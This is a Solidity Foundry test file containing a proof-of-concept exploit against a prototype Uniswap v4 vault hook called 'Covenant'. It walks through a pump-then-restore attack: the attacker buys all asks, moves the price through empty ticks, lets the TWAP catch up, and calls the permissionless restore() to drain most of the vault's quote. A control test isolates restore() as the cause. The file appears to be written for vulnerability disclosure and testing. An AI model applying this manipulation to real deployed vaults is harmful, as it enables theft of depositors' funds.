// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

// Proof of concept against the PROTOTYPE (test/prototype/Covenant.sol), unmodified.
//
// Claim: a third party with no role can take most of the vault's principal quote while every covenant rule
// passes. The lever is `restore`, which is permissionless and anchors the support band to the hook's TWAP.
//
//   1. Buy every ask the vault offers.
//   2. Keep buying into the empty ticks above them. With no liquidity there the price moves for free.
//   3. Wait one TWAP window. Spot and TWAP now agree at the pumped price, so the Guard passes.
//   4. Call restore(). Support reads 0%, so the vault moves its quote to just under the pumped price.
//   5. Sell into that quote, then sell the rest back down the asks you bought.
//
// The control test runs the same trade without step 4. It loses the swap fees and nothing else, which
// isolates restore as the cause.

import {LBPStrategyTestBase} from "./launcher/LBPStrategyTestBase.sol";
import {ILBPInitializer, LBPInitializationParams} from "liquidity-launcher/src/interfaces/ILBPInitializer.sol";
import {MockLBPInitializer} from "./launcher/MockLBPInitializer.sol";
import {PositionDefinition} from "liquidity-launcher/src/types/PositionPlannerTypes.sol";
import {MigratorParameters, PoolParameters, LiquidityAllocationBracket} from "liquidity-launcher/src/libraries/MigratorParams.sol";
import {Covenant} from "./Covenant.sol";

import {IPoolManager} from "@uniswap/v4-core/src/interfaces/IPoolManager.sol";
import {IHooks} from "@uniswap/v4-core/src/interfaces/IHooks.sol";
import {Hooks} from "@uniswap/v4-core/src/libraries/Hooks.sol";
import {TickMath} from "@uniswap/v4-core/src/libraries/TickMath.sol";
import {StateLibrary} from "@uniswap/v4-core/src/libraries/StateLibrary.sol";
import {PoolKey} from "@uniswap/v4-core/src/types/PoolKey.sol";
import {PoolIdLibrary} from "@uniswap/v4-core/src/types/PoolId.sol";
import {Currency} from "@uniswap/v4-core/src/types/Currency.sol";
import {SwapParams} from "@uniswap/v4-core/src/types/PoolOperation.sol";
import {PoolSwapTest} from "@uniswap/v4-core/src/test/PoolSwapTest.sol";
import {LiquidityAmounts} from "@uniswap/v4-periphery/src/libraries/LiquidityAmounts.sol";
import {HookMiner} from "@uniswap/v4-periphery/src/utils/HookMiner.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract PumpRatchetPoC is LBPStrategyTestBase {
    using PoolIdLibrary for PoolKey;
    using StateLibrary for IPoolManager;

    Covenant cov;
    PoolSwapTest router;
    PoolKey key;
    address token;

    address issuer_ = makeAddr("issuer");
    address curator_ = makeAddr("curator");
    address attacker = makeAddr("attacker");

    int24 constant PUMP_TICK = -30_000; // token price x20.1; any level past the asks costs the same

    // Identical to CovenantAttacksTest.setUp: 100 ETH + 100 tokens migrate into a pool at price 1.
    function setUp() public override {
        super.setUp();
        vm.warp(1_800_000_000);
        uint160 flags = uint160(Hooks.BEFORE_INITIALIZE_FLAG | Hooks.AFTER_SWAP_FLAG);
        bytes memory args = abi.encode(POOL_MANAGER, address(strategy), POSITION_MANAGER);
        (address hookAddr, bytes32 salt) = HookMiner.find(address(this), flags, type(Covenant).creationCode, args);
        cov = new Covenant{salt: salt}(POOL_MANAGER, address(strategy), POSITION_MANAGER);
        assertEq(address(cov), hookAddr);
        router = new PoolSwapTest(POOL_MANAGER);

        LiquidityAllocationBracket[] memory bp = new LiquidityAllocationBracket[](1);
        bp[0] = LiquidityAllocationBracket({lowerThreshold: 0, rate: 1e7});
        PositionDefinition[] memory defs = new PositionDefinition[](1);
        defs[0] = PositionDefinition({
            offsetLower: TickMath.MIN_TICK, offsetUpper: TickMath.MAX_TICK, weight: 1e7, overridePositionRecipient: address(0)
        });
        MigratorParameters memory mp = MigratorParameters({
            token: address(0),
            currency: address(0),
            migrationBlock: uint64(block.number + 1),
            reservedTokenAmountForLP: 100 ether,
            recipient: recipient,
            positionRecipient: address(cov),
            poolParameters: PoolParameters({fee: 3000, tickSpacing: 60, hook: address(cov)}),
            positionDefinitions: abi.encode(defs),
            lpAllocationSchedule: new bytes(0)
        });
        LBPInitializationParams memory lbp =
            LBPInitializationParams({initialPriceX96: uint160(1 << 96), tokensSold: 1 ether, currencyRaised: 100 ether});
        (MockLBPInitializer init,) = _initializeWith(mp, 110 ether, uint64(block.number), bp, address(0), lbp);
        token = init.token();
        vm.deal(address(init), 100 ether);
        vm.roll(mp.migrationBlock);
        uint256 lpId = POSITION_MANAGER.nextTokenId();
        strategy.migrate(ILBPInitializer(address(init)));
        key = PoolKey(Currency.wrap(address(0)), Currency.wrap(token), 3000, 60, IHooks(address(cov)));

        // The README's "Standard" preset.
        Covenant.Terms memory t = Covenant.Terms({
            supportBps: 4000,
            supportBandTicks: 1500,
            paceBps: 5000,
            epochLen: 1 days,
            guardTicks: 300,
            twapWindow: 1800,
            unlockStart: uint64(block.timestamp + 90 days),
            unlockDuration: 30 days,
            curatorTimelock: 2 days,
            bounty0: 0.01 ether
        });
        cov.configure(key, t, issuer_, curator_);
        cov.adopt(lpId);

        // The attacker starts with ETH only. Every token they sell later is one they bought from the vault.
        vm.deal(attacker, 10_000 ether);
        vm.prank(attacker);
        IERC20(token).approve(address(router), type(uint256).max);
        vm.deal(address(this), 1 ether);

        // Honest curator's seed, exactly as in CovenantAttacksTest._honestPlan.
        (uint256 a0, uint256 a1) = cov.amountsOf(0);
        uint256[] memory rm = new uint256[](1);
        Covenant.Range[] memory adds = new Covenant.Range[](3);
        adds[0] = Covenant.Range(0, 1500, LiquidityAmounts.getLiquidityForAmount0(_sq(0), _sq(1500), a0 * 60 / 100 - 1e6));
        adds[1] = Covenant.Range(1500, 6000, LiquidityAmounts.getLiquidityForAmount0(_sq(1500), _sq(6000), a0 * 40 / 100 - 1e6));
        adds[2] = Covenant.Range(-3000, 0, LiquidityAmounts.getLiquidityForAmount1(_sq(-3000), _sq(0), a1 - 1e6));
        vm.prank(curator_);
        cov.reshape(rm, adds);

        cov.fundBounty{value: 0.1 ether}();
        vm.warp(block.timestamp + 1 hours); // TWAP settles at tick 0
    }

    function test_PoC_pumpThenRestoreDrainsPrincipalQuote() public {
        (uint256 q0, uint256 b0) = _vaultPrincipal();
        uint256 eth0 = attacker.balance;
        assertEq(IERC20(token).balanceOf(attacker), 0, "attacker holds no tokens going in");
        emit log_named_decimal_uint("vault principal quote before (ETH)", q0, 18);
        emit log_named_decimal_uint("vault principal tokens before     ", b0, 18);

        // 1 + 2: buy every ask, then run the price through the empty ticks above them.
        _swapToTick(PUMP_TICK);
        uint256 bought = IERC20(token).balanceOf(attacker);
        uint256 paid = eth0 - attacker.balance;
        emit log_named_decimal_uint("attacker paid for all asks (ETH)   ", paid, 18);
        emit log_named_decimal_uint("attacker bought (tokens)           ", bought, 18);
        assertEq(_tick(), PUMP_TICK, "price sits wherever the attacker put it");

        // 3: one TWAP window. No further swaps are needed; nobody can sell at this price because no bid exists here.
        vm.warp(block.timestamp + 2 hours);
        assertEq(cov.twapTick(), PUMP_TICK, "TWAP has followed the pump");
        (uint256 have, uint256 need) = cov.supportBps();
        emit log_named_uint("support bps as measured at the pumped TWAP", have);
        assertLt(have, need, "support reads as lapsed");

        // 4: the permissionless call. Each one also pays the attacker the bounty.
        uint256 restores;
        uint256 ethBeforeRestore = attacker.balance;
        while (have < need && restores < 4) {
            uint256 idx = _farthestQuoteRange();
            vm.prank(attacker);
            cov.restore(idx);
            restores++;
            (have, need) = cov.supportBps();
        }
        uint256 bounties = attacker.balance - ethBeforeRestore;
        emit log_named_uint("restore() calls made by the attacker", restores);
        emit log_named_decimal_uint("bounties paid to the attacker (ETH)", bounties, 18);
        emit log_named_uint("support bps after restore", have);

        // 5: sell back exactly what was bought. Nothing else.
        _sellTokens(bought);
        assertEq(IERC20(token).balanceOf(attacker), 0, "attacker is flat in tokens again");

        (uint256 q1, uint256 b1) = _vaultPrincipal();
        uint256 profit = attacker.balance - eth0;
        emit log_named_decimal_uint("attacker net profit (ETH)          ", profit, 18);
        emit log_named_decimal_uint("vault principal quote after (ETH)  ", q1, 18);
        emit log_named_decimal_uint("vault principal tokens after       ", b1, 18);
        emit log_named_uint("principal quote lost (bps)", (q0 - q1) * 1e4 / q0);

        assertGt(profit, q0 / 2, "attacker walks away with more than half the principal quote");
        assertLt(q1, q0 / 2, "and the vault's quote is what paid for it");
        // The 0.3% fee on the attacker's sell accrues to the vault as uncollected fees, outside principal.
        assertApproxEqRel(b1, b0, 0.004e18, "the vault got its own tokens back and nothing more");
    }

    function test_control_samePumpWithoutRestoreOnlyCostsFees() public {
        (uint256 q0,) = _vaultPrincipal();
        uint256 eth0 = attacker.balance;

        _swapToTick(PUMP_TICK);
        uint256 bought = IERC20(token).balanceOf(attacker);
        vm.warp(block.timestamp + 2 hours);
        _sellTokens(bought);

        (uint256 q1,) = _vaultPrincipal();
        assertLt(attacker.balance, eth0, "without restore the round trip is a loss");
        emit log_named_decimal_uint("attacker net loss without restore (ETH)", eth0 - attacker.balance, 18);
        assertApproxEqRel(q1, q0, 0.01e18, "vault quote unchanged to within 1%");
    }

    // ------------------------------------------------------------------ helpers
    /// @dev Principal only: what the ranges hold at spot. Uncollected fees are excluded.
    function _vaultPrincipal() internal view returns (uint256 quote, uint256 base) {
        for (uint256 i; i < cov.rangeCount(); i++) {
            (uint256 a0, uint256 a1) = cov.amountsOf(i);
            quote += a0;
            base += a1;
        }
    }

    /// @dev The range holding the most quote outside the support band, which is what a keeper would pick.
    function _farthestQuoteRange() internal view returns (uint256 best) {
        int24 bandTop = cov.twapTick() + 1500;
        uint256 bestQ;
        for (uint256 i; i < cov.rangeCount(); i++) {
            Covenant.Range memory r = cov.rangeAt(i);
            if (r.lower < bandTop) continue;
            (uint256 a0,) = cov.amountsOf(i);
            if (a0 > bestQ) (bestQ, best) = (a0, i);
        }
        require(bestQ > 0, "no quote outside the band");
    }

    function _swapToTick(int24 target) internal {
        bool zeroForOne = target < _tick();
        vm.startPrank(attacker);
        router.swap{value: zeroForOne ? 2000 ether : 0}(
            key,
            SwapParams({zeroForOne: zeroForOne, amountSpecified: -2000 ether, sqrtPriceLimitX96: _sq(target)}),
            PoolSwapTest.TestSettings({takeClaims: false, settleUsingBurn: false}),
            ""
        );
        vm.stopPrank();
    }

    function _sellTokens(uint256 amount) internal {
        vm.startPrank(attacker);
        router.swap(
            key,
            SwapParams({zeroForOne: false, amountSpecified: -int256(amount), sqrtPriceLimitX96: TickMath.MAX_SQRT_PRICE - 1}),
            PoolSwapTest.TestSettings({takeClaims: false, settleUsingBurn: false}),
            ""
        );
        vm.stopPrank();
    }

    function _tick() internal view returns (int24 t) {
        (, t,,) = POOL_MANAGER.getSlot0(key.toId());
    }

    function _sq(int24 t) internal pure returns (uint160) {
        return TickMath.getSqrtPriceAtTick(t);
    }
}
